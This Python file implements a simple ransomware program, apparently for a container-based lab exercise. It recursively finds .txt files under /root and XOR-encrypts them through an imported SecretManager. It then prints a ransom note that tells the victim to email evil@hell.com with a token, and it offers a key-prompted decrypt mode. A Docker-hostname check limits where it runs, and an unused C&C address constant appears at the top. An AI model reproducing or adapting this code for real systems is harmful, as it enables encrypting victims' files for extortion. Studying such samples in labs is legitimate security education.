import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager

import base64


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"


# fency message
def display_message(_token_:str)->None: 
    ENCRYPT_MESSAGE = f"""\n
#####################################################################################################
#  _____                                                                                            #
# |  __ \\                                                                                           #
# | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _  #
# |  ___/ '__/ _ \\ '_ \\ / _` | '__/ _ \\ | | | |/ _ \\| | | | '__| | '_ ` _ \\ / _ \\| '_ \\ / _ \\ | | | #
# | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| | #
# |_|   |_|  \\___| .__/ \\__,_|_|  \\___|  \\__, |\\___/ \\__,_|_|    |_| |_| |_|\\___/|_| |_|\\___|\\__, | #
#                | |                      __/ |                                               __/ | #
#                |_|                     |___/                                               |___/  #
#                                                                                                   #
#####################################################################################################
Your txt files have been locked. Send an email to evil@hell.com with title '{_token_}' to unlock your data.
\n"""
    print(ENCRYPT_MESSAGE)
    return None




class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)


    def get_files(self, filter:str)->list:
        # main function for finding all .txt file to encrypt/decrypt
        lfiles = sorted(Path('/root').rglob(filter)) #read all path
        print(lfiles)
        return lfiles


    def encrypt(self):
        # main function for encrypting
        
        # Listing txt files
        lfile = self.get_files('*.txt')
        # Secret Manager
        mySecret = SecretManager()
        mySecret.setup()
        # file encryption
        mySecret.xorfiles(lfile)
        # display message on target machine
        display_message(mySecret.get_hex_token())
        
        return
        


    def decrypt(self):
        # main function for decrypting

        # Secret Manager
        mySecret = SecretManager()
        # loading current secrets (salt+token)
        mySecret.load()
        # asking for the key: loop
        while True:
            try:
                tiped_key = input("Enter the key: ")
                mySecret.set_key(bytes(tiped_key, 'utf8'))
                break
            except:
                print("\nWrong key, try again...\n")
        
        # Listing txt files
        lfile = self.get_files('*.txt')
        # file decryption
        mySecret.xorfiles(lfile)
        # cleaning
        mySecret.clean()
        # display message on target machine
        print("\n\t\t+-+-+-+-+  +-+-+-+-+-+  +-+-+-+-+-+-+-+-+  +-+-+-+-+  +-+-+-++-+\n\
                |N|I|C|E|  |D|O|I|N|G|  |B|U|S|I|N|E|S|S|  |W|I|T|H|  |Y|O|U||!|\n\
                +-+-+-+-+  +-+-+-+-+-+  +-+-+-+-+-+-+-+-+  +-+-+-+-+  +-+-+-++-+\n")

        return


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()


